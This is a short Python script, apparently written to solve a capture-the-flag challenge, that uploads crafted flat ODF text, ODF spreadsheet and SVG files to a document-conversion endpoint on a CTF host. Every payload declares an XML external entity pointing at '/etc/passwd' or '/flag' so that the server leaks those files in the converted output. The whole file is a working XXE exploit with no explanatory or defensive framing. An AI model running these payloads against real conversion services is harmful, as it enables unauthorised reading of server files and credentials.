#!/usr/bin/env python3
"""Temporary CTF XML external-entity probe."""
import urllib.error
import urllib.request
import uuid

BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"


def send(data, filename, fmt, label):
    boundary = "----Arena" + uuid.uuid4().hex
    body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"data\"; filename=\"{filename}\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode() + data.encode() + f"\r\n--{boundary}--\r\n".encode())
    req = urllib.request.Request(BASE + "/cool/convert-to/" + fmt, data=body, method="POST")
    req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
    print("\n===", label, filename, "->", fmt, flush=True)
    try:
        with urllib.request.urlopen(req, timeout=90) as r:
            raw = r.read(1000000)
            print("STATUS", r.status, "TYPE", r.headers.get("Content-Type"), "BYTES", len(raw), flush=True)
            if raw.startswith(b"%PDF"):
                print("PDF_BYTES", len(raw), "PDF_ASCII", "".join(chr(c) if 32 <= c < 127 else "." for c in raw[:3000]), flush=True)
            else:
                print("RESPONSE", raw.decode("utf-8", "replace"), flush=True)
    except urllib.error.HTTPError as e:
        print("HTTP_ERROR", e.code, e.read(200000).decode("utf-8", "replace"), flush=True)
    except Exception as e:
        print("ERROR", repr(e), flush=True)


def fodt(target):
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE office:document [<!ENTITY xxe SYSTEM "file://{target}">]>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" office:version="1.2" office:mimetype="application/vnd.oasis.opendocument.text"><office:body><office:text><text:p>BEFORE_XXE</text:p><text:p>&xxe;</text:p><text:p>AFTER_XXE</text:p></office:text></office:body></office:document>'''


def fods(target):
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE office:document [<!ENTITY xxe SYSTEM "file://{target}">]>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" office:version="1.2" office:mimetype="application/vnd.oasis.opendocument.spreadsheet"><office:body><office:spreadsheet><table:table table:name="Sheet1"><table:table-row><table:table-cell office:value-type="string"><text:p>&xxe;</text:p></table:table-cell></table:table-row></table:table></office:spreadsheet></office:body></office:document>'''


def svg(target):
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://{target}">]>
<svg xmlns="http://www.w3.org/2000/svg" width="800" height="600"><text x="10" y="30" font-size="10">BEFORE_XXE</text><text x="10" y="60" font-size="10">&xxe;</text><text x="10" y="90" font-size="10">AFTER_XXE</text></svg>'''


for target in ("/etc/passwd", "/flag"):
    send(fodt(target), "xxe.fodt", "txt", "FODT_XXE")
    send(fods(target), "xxe.fods", "csv", "FODS_XXE")
    send(svg(target), "xxe.svg", "svg", "SVG_XXE_ROUNDTRIP")
send(svg("/flag"), "xxe.svg", "pdf", "SVG_XXE_PDF")
